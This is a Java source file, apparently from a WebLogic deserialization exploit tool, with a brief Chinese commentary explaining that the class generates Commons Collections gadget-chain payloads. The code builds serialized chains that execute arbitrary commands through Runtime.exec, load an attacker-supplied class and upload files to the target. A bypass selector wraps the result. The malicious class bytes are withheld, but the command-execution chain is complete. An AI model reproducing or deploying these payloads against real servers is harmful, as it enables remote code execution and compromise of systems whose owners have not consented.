package com.supeream.serial;import com.supeream.weblogic.BypassPayloadSelector;import org.apache.commons.collections.Transformer;import org.apache.commons.collections.functors.ChainedTransformer;import org.apache.commons.collections.functors.ConstantTransformer;import org.apache.commons.collections.functors.InvokerTransformer;import org.apache.commons.collections.keyvalue.TiedMapEntry;import org.apache.commons.collections.map.LazyMap;import org.mozilla.classfile.DefiningClassLoader;import java.lang.reflect.Field;import java.lang.reflect.InvocationHandler;import java.lang.reflect.Proxy;import java.util.HashMap;import java.util.HashSet;import java.util.Map;/** * Created by nike on 17/7/3. */public class SerialDataGenerator &#123;    private static final String REMOTE = &quot;com.supeream.payload.RemoteImpl&quot;;    private static final String remoteHex = &quot;不写出来了，恶意文件的16进制&quot;;    private static byte[] serialData(Transformer[] transformers) throws Exception &#123;        final Transformer transformerChain = new ChainedTransformer(transformers);        final Map innerMap = new HashMap();        // 初始化map 设置laymap        Map&lt;Object,Object&gt; lazymap = LazyMap.decorate(innerMap,new ConstantTransformer(1)); //随便改成什么Transformer        TiedMapEntry tiedMapEntry=new TiedMapEntry(lazymap, &quot;aaa&quot;);        HashMap&lt;Object, Object&gt; hashMap=new HashMap();        hashMap.put(tiedMapEntry,&quot;bbb&quot;);        innerMap.remove(&quot;aaa&quot;);        Field factory = LazyMap.class.getDeclaredField(&quot;factory&quot;);        factory.setAccessible(true);        factory.set(lazymap,transformerChain);        Object _handler = BypassPayloadSelector.selectBypass(hashMap);        return Serializables.serialize(_handler);    &#125;    private static Transformer[] defineAndLoadPayloadTransformerChain(String className, byte[] clsData, String[] bootArgs) throws Exception &#123;        Transformer[] transformers = new Transformer[]&#123;                new ConstantTransformer(DefiningClassLoader.class),                new InvokerTransformer(&quot;getDeclaredConstructor&quot;, new Class[]&#123;Class[].class&#125;, new Object[]&#123;new Class[0]&#125;),                new InvokerTransformer(&quot;newInstance&quot;, new Class[]&#123;Object[].class&#125;, new Object[]&#123;new Object[0]&#125;),                new InvokerTransformer(&quot;defineClass&quot;,                        new Class[]&#123;String.class, byte[].class&#125;, new Object[]&#123;className, clsData&#125;),                new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;main&quot;, new Class[]&#123;String[].class&#125;&#125;),                new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, new Object[]&#123;bootArgs&#125;&#125;),                new ConstantTransformer(new HashSet())&#125;;        return transformers;    &#125;    private static Transformer[] uploadTransformerChain(String className, byte[] clsData, String filePath, byte[] content) throws Exception &#123;        Transformer[] transformers = new Transformer[]&#123;                new ConstantTransformer(DefiningClassLoader.class),                new InvokerTransformer(&quot;getDeclaredConstructor&quot;, new Class[]&#123;Class[].class&#125;, new Object[]&#123;new Class[0]&#125;),                new InvokerTransformer(&quot;newInstance&quot;, new Class[]&#123;Object[].class&#125;, new Object[]&#123;new Object[0]&#125;),                new InvokerTransformer(&quot;defineClass&quot;,                        new Class[]&#123;String.class, byte[].class&#125;, new Object[]&#123;className, clsData&#125;),                new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;uploadFile&quot;, new Class[]&#123;String.class, byte[].class&#125;&#125;),                new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, new Object[]&#123;filePath, content&#125;&#125;),                new ConstantTransformer(new HashSet())&#125;;        return transformers;    &#125;    private static Transformer[] blindExecutePayloadTransformerChain(String[] execArgs) throws Exception &#123;        Transformer[] transformers = new Transformer[]&#123;                new ConstantTransformer(Runtime.class),                new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;                        String.class, Class[].class&#125;, new Object[]&#123;                        &quot;getRuntime&quot;, new Class[0]&#125;),                new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;                        Object.class, Object[].class&#125;, new Object[]&#123;                        null, new Object[0]&#125;),                new InvokerTransformer(&quot;exec&quot;,                        new Class[]&#123;String[].class&#125;, new Object[]&#123;execArgs&#125;),                new ConstantTransformer(new HashSet())&#125;;        return transformers;    &#125;    public static byte[] serialRmiDatas(String[] bootArgs) throws Exception &#123;        return serialData(defineAndLoadPayloadTransformerChain(SerialDataGenerator.REMOTE, BytesOperation.hexStringToBytes(SerialDataGenerator.remoteHex), bootArgs));    &#125;    public static byte[] serialBlindDatas(String[] execArgs) throws Exception &#123;        return serialData(blindExecutePayloadTransformerChain(execArgs));    &#125;    public static byte[] serialUploadDatas(String filePath, byte[] content) throws Exception &#123;        return serialData(uploadTransformerChain(SerialDataGenerator.REMOTE, BytesOperation.hexStringToBytes(SerialDataGenerator.remoteHex), filePath, content));    &#125;&#125;
初步看一眼就是生成CC链的地方，里面包含多种chaintransformer，比如defineAndLoadPayloadTransformerChain、uploadTransformerChain、blindExecutePayloadTransformerChain，其中我们经常用的就是普通的blindExecutePayloadTransformerChain，执行完这个方法就进入对应的serial方法那对标上面那么几种transformer，那肯定也有serial因此这一块就是生成payload的地方
